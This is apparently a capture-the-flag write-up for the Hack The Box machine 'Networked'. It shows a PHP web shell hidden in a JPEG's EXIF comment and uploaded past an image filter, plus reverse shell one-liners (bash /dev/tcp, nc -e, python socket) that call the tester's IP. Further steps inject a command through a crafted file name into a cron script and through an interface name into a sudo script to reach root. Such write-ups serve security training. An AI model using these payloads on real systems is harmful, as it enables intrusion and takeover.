# Networked HTB, IP 10.10.10.146

# Initial Enumeration

**1. nmap -sC -sV 10.10.10.146**

![n1](https://user-images.githubusercontent.com/15195048/93912551-c0f9cd80-fcb8-11ea-8190-ff6fb2d2f77f.png)

**2. Dirb/ Gobuster**

dirb http://10.10.10.146

dirb http://10.10.10.146 -X .php

![n2](https://user-images.githubusercontent.com/15195048/93912555-c1926400-fcb8-11ea-8d78-6e845abdae2d.png)

----------------------------------------------------------------------------------------------------------------------------
# Port Enumeration

## 1.Enumerating port 80

![n3](https://user-images.githubusercontent.com/15195048/93912557-c22afa80-fcb8-11ea-8ffd-57450756147c.png)


View page source: **Control+U**

![n4](https://user-images.githubusercontent.com/15195048/93912560-c22afa80-fcb8-11ea-9948-39fb8654bd19.png)

**Interesting Files**

http://10.10.10.146/upload.php

![n5](https://user-images.githubusercontent.com/15195048/93912562-c2c39100-fcb8-11ea-9a85-4ecce8d2b0b1.png)


Trying to upload a shell we see the error “Invalid image file”

http:10.10.10.146/backup


![n6](https://user-images.githubusercontent.com/15195048/93912563-c2c39100-fcb8-11ea-8c29-6fd246172a25.png)

Download the file **backup.tar**

![n7](https://user-images.githubusercontent.com/15195048/93912564-c2c39100-fcb8-11ea-89b3-c5362ba8366f.png)


![n8](https://user-images.githubusercontent.com/15195048/93912565-c35c2780-fcb8-11ea-9c6a-8655f622491b.png)


![n9](https://user-images.githubusercontent.com/15195048/93912566-c35c2780-fcb8-11ea-89ed-51178e94ab9e.png)


**Modifying bb.jpeg**

**exiftool -Comment='<?php echo** "<pre>"; system($_GET['cmd']); ?>'** bb.jpeg

**mv bb.jpeg bb.php.jpeg**

We successfully uploaded bb.php.jpeg photo.
view-source:http://10.10.10.146/uploads/10_10_14_21.php.jpeg?cmd=nc -e /bin/bash 10.10.14.21 8888

![n10](https://user-images.githubusercontent.com/15195048/93912571-c3f4be00-fcb8-11ea-906a-c4cb4c000e9e.png)


Try..

**A)** bash -i >& /dev/tcp/10.10.14.21/1234 0>&1

**B)** nc -e /bin/sh 10.10.14.21 1234  DONE

**C)** python -c 'import soc ket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.21",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);’


  After enumerating home directory of user guly we see that a php script is running as a cronjob which could be used to gain shell as that user. Lets look at code check_attack.php.  


![n11](https://user-images.githubusercontent.com/15195048/93912575-c3f4be00-fcb8-11ea-8d2f-c132c2b482c8.png)

![n12](https://user-images.githubusercontent.com/15195048/93912576-c48d5480-fcb8-11ea-8114-8676404dfb06.png)


**Notes:**
We see that it scans for files, If the files were found as malicious, then a cron job will check and report to guly with mail($to, $msg, $msg, $headers, "-F$value"); every three minutes, for files in /var/www/html/uploads that doesn’t begin with an IP address. We can touch a file with a file name that begins with ; to separate sendmail from the command that we want to execute.
   
**touch ';nc 10.10.12.161 4321 -c bash'**
   
 ![n13](https://user-images.githubusercontent.com/15195048/93912579-c525eb00-fcb8-11ea-8c04-57d78a66b2d9.png)
 
   
 ![n14](https://user-images.githubusercontent.com/15195048/93912580-c525eb00-fcb8-11ea-8d78-b6a230c2b66c.png)
 
   user.txt

-------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Privilege Escalation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   sudo -l
   (root) NOPASSWD: /usr/local/sbin/changename.sh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

   As guly I checked sudo -l and found that guly can run /usr/local/sbin/changename.sh as root without a password:
   
   
   ![n15](https://user-images.githubusercontent.com/15195048/93912582-c5be8180-fcb8-11ea-985d-e5273ce8f22d.png)

  This script simply creates a network script for an interface called guly then activates that interface. It asks the user for these options: NAME, PROXY_METHOD, BROWSER_ONLY, BOOTPROTO. We’re interested in the options because according to this page(https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f) we can inject commands in the interface name. Let’s try to execute bash:
  
   interface NAME:
   gu bash 
  
   or   
![n16](https://user-images.githubusercontent.com/15195048/93912583-c5be8180-fcb8-11ea-9273-c568c4345679.png)

root.txt
